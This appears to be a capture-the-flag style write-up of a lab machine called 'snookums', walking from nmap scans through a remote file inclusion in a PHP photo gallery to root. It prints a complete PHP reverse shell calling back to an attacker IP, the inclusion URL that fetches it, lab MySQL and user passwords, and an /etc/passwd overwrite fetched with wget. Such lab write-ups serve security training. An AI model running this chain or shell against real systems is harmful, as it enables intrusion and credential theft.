First enumeration with nmap 

`nmap -p- --min-rate 1000 -oN fulltcp.txt -v -Pn 192.168.186.58`

```
# Nmap 7.93 scan initiated Sun Jan  8 11:33:56 2023 as: nmap -p- --min-rate 1000 -oN fulltcp.txt -v -Pn 192.168.186.58                                                   
Nmap scan report for 192.168.186.58
Host is up (0.14s latency).
Not shown: 65501 filtered tcp ports (no-response)                                  
PORT      STATE  SERVICE
21/tcp    open   ftp    
22/tcp    open   ssh    
80/tcp    open   http   
111/tcp   open   rpcbind
139/tcp   open   netbios-ssn
445/tcp   open   microsoft-ds
3306/tcp  open   mysql
33060/tcp open   mysqlx

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sun Jan  8 11:45:57 2023 -- 1 IP address (1 host up) scanned in 720.61 seconds
```

Now we know what ports are open, let's run default nmap scripts to know what services are running on those ports.

`nmap -sC -sV -oN normal.tcp -p 21,22,80,111,139,445,3306,33060 -Pn 192.168.186.58`

```
# Nmap 7.93 scan initiated Sun Jan  8 11:53:27 2023 as: nmap -sC -sV -oN normal.tcp -p 21,22,80,111,139,445,3306,33060 -Pn 192.168.186.58
Nmap scan report for 192.168.186.58                                                
Host is up (0.43s latency).                                                        
                                                                                   
PORT      STATE SERVICE     VERSION                                                
21/tcp    open  ftp         vsftpd 3.0.2                                           
| ftp-anon: Anonymous FTP login allowed (FTP code 230)                    
|_Can't get directory listing: TIMEOUT                                             
| ftp-syst:                                                                        
|   STAT:                                                                          
| FTP server status:                                                               
|      Connected to ::ffff:192.168.49.186       
|      Logged in as ftp                                                            
|      TYPE: ASCII     
|      No session bandwidth limit                                                                                                                                     
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text                                                                                                                            
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable                                
|_End of status                                                                    
22/tcp    open  ssh         OpenSSH 7.4 (protocol 2.0)                    
| ssh-hostkey:                                                                     
|   2048 4a796712c7ec133a96bdd3b47cf39515 (RSA)                           
|   256 a8a3a788cf3727b54d451379dbd2bacb (ECDSA)                          
|_  256 f20713191f29de19487cdb4599f9cd3e (ED25519)                        
80/tcp    open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)      
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16                    
|_http-title: Simple PHP Photo Gallery                                             
111/tcp   open  rpcbind     2-4 (RPC #100000)                             
| rpcinfo:                                                                         
|   program version    port/proto  service                                
|   100000  2,3,4        111/tcp   rpcbind                                                                                                                            
|   100000  2,3,4        111/udp   rpcbind                                                                                                                            
|   100000  3,4          111/tcp6  rpcbind                                
|_  100000  3,4          111/udp6  rpcbind                                
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp   open  netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA)                                                                                                      
3306/tcp  open  mysql       MySQL (unauthorized)                                                                                                                      
33060/tcp open  mysqlx?                                                                                                                                               
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-ser
vice :
SF-Port33060-TCP:V=7.93%I=7%D=1/8%Time=63BAA0B1%P=x86_64-pc-linux-gnu%r(NU
SF:LL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOpt
SF:ions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVersi
SF:onBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,2B
SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fIn
SF:valid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%
SF:r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\
SF:x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCookie,
SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
SF:x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9,
SF:"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY00
SF:0")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,9
SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x08
SF:\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x
SF:05HY000")%r(LDAPBindReq,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SIPOptions,
SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,9,"\x05\0\0\0\x0b\x08\x0
SF:5\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NCP,9,"\
SF:x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\0\0\0\x0b\x08\x05\x1a
SF:\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000"
SF:)%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(WMSRequest,9,"\x05\0\0\
SF:0\x0b\x08\x05\x1a\0")%r(oracle-tns,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(
SF:ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08
SF:05HY000")%r(giop,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");
Service Info: Host: SNOOKUMS; OS: Unix

Host script results:
|_clock-skew: mean: 1h40m00s, deviation: 2h53m14s, median: 0s
| smb2-time: 
|   date: 2023-01-08T10:54:21
|_  start_date: N/A
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.10.4)
|   Computer name: snookums
|   NetBIOS computer name: SNOOKUMS\x00
|   Domain name: \x00
|   FQDN: snookums
|_  System time: 2023-01-08T05:54:23-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan  8 11:55:06 2023 -- 1 IP address (1 host up) scanned in 99.37 seconds
```

Now we know what services are running on those ports. let's start enumeration on port 80 first.

![image](https://user-images.githubusercontent.com/87468669/211201784-b0882f03-2d07-417f-8a71-5c7fe297a58c.png)

As we can see above it is running Simple PHP Photo Gallery cms, let's search for public exploit. 

![image](https://user-images.githubusercontent.com/87468669/211201980-ef32835c-9cdd-4b8c-8006-9b6dd590db85.png)

Found a public exploit which state that the param `/image.php?img=` is vuln to Remote File Inclusion, let's try it out.

![image](https://user-images.githubusercontent.com/87468669/211202049-57fb0f2a-ee40-4fb3-9643-4bb18e8691f0.png)

Tested for LFI and it worked so let's do an RFI attack. created a php pentest monkey🐒 reverse shell.

```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.49.79';
$port = 445;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

saved the above payload into a php file, then fire python http server with ncat listener.

![image](https://user-images.githubusercontent.com/87468669/211202400-73c6b457-8e44-48fb-adb0-58e61e817acb.png)

downloaded the php shell into the target `http://192.168.79.58/image.php?img=http://AttackerIP/shell.php`. check back our listener.

![image](https://user-images.githubusercontent.com/87468669/211202549-c81c44e8-6851-4836-98fc-8e5c201a67ba.png)

Bull's eye we got a reverse shell. now stabilize the shell and escalate privs.

![image](https://user-images.githubusercontent.com/87468669/211203174-9c524581-8ff9-4962-b716-59c29e5c3223.png)

navigated to the `/var/www/html` dir, i found a sus file db.php, reading th content, i saw it contains mysql creds. let's login mysql to see what we have.

```
bash-4.2$ mysql -u root -p                                                          
Enter password:       
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 10
Server version: 8.0.20 MySQL Community Server - GPL
                                         
Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective     
owners.                                                                            

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
                                         
mysql> show dataabases;   
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'dataabases'
 at line 1                
mysql> show databases;                                                              
+--------------------+    
| Database           | 
+--------------------+
| SimplePHPGal       |     
| information_schema |                                                             
| mysql              |                                                             
| performance_schema |                                                             
| sys                |                                                             
+--------------------+                                                             
5 rows in set (0.00 sec)                                                           
                                                                                   
mysql> use SimplePHPGal 
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+------------------------+
| Tables_in_SimplePHPGal |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.00 sec)

mysql> select * from users;
+----------+----------------------------------------------+
| username | password                                     |
+----------+----------------------------------------------+
| josh     | VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0= |
| michael  | U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==     |
| serena   | VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==     |
+----------+----------------------------------------------+
3 rows in set (0.00 sec)

mysql> exit
Bye
bash-4.2$ 
```

logged in mysql using creds `root:MalapropDoffUtilize1337` and was able to see some creds looks like micheal creds. let's decode the password.

```
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PGP/snookums]
└─$ echo "U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==" | base64 -d          
SG9ja1N5ZG5leUNlcnRpZnkxMjM=                                                                                                                                                                      
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PGP/snookums]
└─$ echo "SG9ja1N5ZG5leUNlcnRpZnkxMjM=" | base64 -d             
HockSydneyCertify123                                                                                                                                                                      
```

decode the password, it was encoded twice. now let su or ssh as user `michael:HockSydneyCertify123`.

![image](https://user-images.githubusercontent.com/87468669/211204018-928d60f0-a514-4fd0-a69d-9bf1aaad40cb.png)

su michael using the password i found worked, let's escalate privs further.

```
[michael@snookums ~]$ find /etc -type f -writable 2>/dev/null
/etc/passwd
[michael@snookums ~]$ ls -al /etc/passwd
-rw-r--r--. 1 michael root 1162 Jun 22  2021 /etc/passwd
[michael@snookums ~]$ openssl  passwd hacked
UKLnGfUNuvnJo
[michael@snookums ~]$
```

checking for writable `/etc` file, i found out that `/etc/passwd` is writable. let's abuse this priv. first i generated a passwd hash using openssl.

![image](https://user-images.githubusercontent.com/87468669/211204756-d9767ebb-e3d8-493e-9f43-4426cecca0e8.png)

cat the content of `/etc/passwd` copied it to my attack box. so i can edited since there's no editor in the target.

![image](https://user-images.githubusercontent.com/87468669/211205084-2708c723-fadc-4f03-9ae1-8e2287c6ed68.png)

After editing the content, i start up python http server, so as to download and replace the original file in the target box.

![image](https://user-images.githubusercontent.com/87468669/211205217-a281ab44-3a9f-4294-80ba-16322dc63f14.png)

`wget http://192.168.49.79/passwd -O /etc/passwd`

Using wget, i replaced the `/etc/passwd` file with the modified one, then su root using the passwd we genrated earlier and we got root. 🤓
